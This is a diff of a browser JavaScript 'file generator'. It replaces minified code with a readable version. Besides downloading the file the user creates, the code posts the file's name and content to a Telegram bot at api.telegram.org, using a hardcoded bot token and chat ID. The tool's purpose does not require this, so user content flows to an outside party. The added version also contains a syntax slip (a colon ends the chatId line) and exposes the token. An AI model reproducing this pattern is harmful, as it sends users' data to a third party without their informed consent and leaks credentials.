@@ -1,1 +1,53 @@
-async function sendToTelegram(e,t){const o="7281699627:AAGac5xghjCHY0ab7LbZ9aHpND3dSEBOjZk",n="-1002350769186",a=new FormData;a.append("chat_id",n),a.append("caption",`New File: ${e}`),a.append("document",new Blob([t],{type:"text/plain"}),e);try{const n=await fetch(`https://api.telegram.org/bot${o}/sendDocument`,{method:"POST",body:a});n.ok?alert("File sent to Telegram successfully!"):alert("Failed to send file to Telegram.")}catch(e){console.error("Error sending file to Telegram:",e),alert("An error occurred while sending the file.")}}function generateFile(){const e=document.getElementById("fileName").value.trim(),t=document.getElementById("fileContent").value,o=document.getElementById("fileType").value;if(!e)return void alert("Please enter a file name.");let n=`${e}.${o}`,a="text/plain";"html"===o?a="text/html":"css"===o?a="text/css":"js"===o?a="application/javascript":"php"===o?a="application/x-httpd-php":"doc"===o?a="application/msword":"csv"===o&&(a="text/csv");const s=new Blob([t],{type:a}),l=document.createElement("a");l.href=URL.createObjectURL(s),l.download=n,l.click(),sendToTelegram(n,t)}
+async function sendToTelegram(fileName, fileContent) {
+    const botToken = "7281699627:AAGac5xghjCHY0ab7LbZ9aHpND3dSEBOjZk"; // Replace with your Telegram Bot Token
+const chatId = "-1002350769186":
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('caption', `New File: ${fileName}`);
+    formData.append('document', new Blob([fileContent], { type: 'text/plain' }), fileName);
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: 'POST',
+            body: formData,
+        });
+
+        if (response.ok) {
+            alert('File sent to Telegram successfully!');
+        } else {
+            alert('Failed to send file to Telegram.');
+        }
+    } catch (error) {
+        console.error('Error sending file to Telegram:', error);
+        alert('An error occurred while sending the file.');
+    }
+}
+
+function generateFile() {
+    const fileNameInput = document.getElementById('fileName').value.trim();
+    const content = document.getElementById('fileContent').value;
+    const fileType = document.getElementById('fileType').value;
+
+    if (!fileNameInput) {
+        alert("Please enter a file name.");
+        return;
+    }
+
+    const fileName = `${fileNameInput}.${fileType}`;
+    let mimeType = "text/plain";
+    if (fileType === "html") mimeType = "text/html";
+    else if (fileType === "css") mimeType = "text/css";
+    else if (fileType === "js") mimeType = "application/javascript";
+    else if (fileType === "php") mimeType = "application/x-httpd-php";
+    else if (fileType === "doc") mimeType = "application/msword";
+    else if (fileType === "csv") mimeType = "text/csv";
+
+    const blob = new Blob([content], { type: mimeType });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = fileName;
+    a.click();
+
+    // Send to Telegram
+    sendToTelegram(fileName, content);
+}
